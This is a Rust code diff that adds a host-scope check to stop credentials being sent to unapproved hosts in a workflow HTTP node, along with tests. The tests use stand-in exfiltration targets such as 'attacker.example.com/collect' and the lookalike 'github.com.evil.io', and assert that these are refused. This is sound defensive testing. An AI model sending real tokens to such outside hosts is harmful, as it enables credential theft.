@@ -294,6 +294,7 @@ impl Node for HttpNode {
         // Add authentication if credential is specified
         if let Some(credential_name) = &config.credential {
             if let Some(credential_value) = ctx.get_credential(credential_name) {
+                ctx.check_credential_url(credential_name, &url)?;
                 request = apply_authentication(request, credential_value, &config.auth_type)?;
             } else {
                 return Err(Error::Node(format!(
@@ -647,5 +648,74 @@ mod tests {
         // content type header boundary matches body boundary
         let boundary = content_type.split_once("boundary=").unwrap().1;
         assert!(text.contains(&format!("--{boundary}--")));
+    }
+
+    fn ctx_with_scoped_token(scope: crate::credentials::CredentialScope) -> NodeContext {
+        NodeContext::new("exec-1", "wf")
+            .with_credentials(HashMap::from([("gh".to_string(), "tok".to_string())]))
+            .with_credential_scopes(HashMap::from([("gh".to_string(), scope)]))
+    }
+
+    #[tokio::test]
+    async fn scoped_credential_is_refused_for_other_hosts() {
+        let node = HttpNode::new();
+        let ctx = ctx_with_scoped_token(
+            crate::credentials::CredentialScope::hosts(["api.github.com"]).unwrap(),
+        );
+        let err = node
+            .execute(
+                &serde_json::json!({
+                    "url": "https://attacker.example.com/collect",
+                    "credential": "gh",
+                    "auth_type": "bearer"
+                }),
+                &ctx,
+            )
+            .await
+            .unwrap_err()
+            .to_string();
+        assert!(
+            err.contains("may not be sent to attacker.example.com"),
+            "{err}"
+        );
+        assert!(err.contains("r8r credentials scope gh"), "{err}");
+    }
+
+    #[test]
+    fn check_credential_url_rules() {
+        use crate::credentials::CredentialScope;
+        let ctx = ctx_with_scoped_token(CredentialScope::hosts(["*.github.com"]).unwrap());
+        assert!(
+            ctx.check_credential_url("gh", "https://api.github.com/x")
+                .is_ok()
+        );
+        assert!(
+            ctx.check_credential_url("gh", "https://API.GITHUB.COM:8443/x")
+                .is_ok()
+        );
+        assert!(
+            ctx.check_credential_url("gh", "https://github.com.evil.io/")
+                .is_err()
+        );
+        assert!(ctx.check_credential_url("gh", "not a url").is_err());
+
+        // Unscoped (pre-scoping) and unknown credentials are allowed with a warning.
+        let legacy = ctx_with_scoped_token(CredentialScope::default());
+        assert!(
+            legacy
+                .check_credential_url("gh", "https://anywhere.example/")
+                .is_ok()
+        );
+        assert!(
+            legacy
+                .check_credential_url("other", "https://anywhere.example/")
+                .is_ok()
+        );
+
+        let any = ctx_with_scoped_token(CredentialScope::any());
+        assert!(
+            any.check_credential_url("gh", "https://anywhere.example/")
+                .is_ok()
+        );
     }
 }
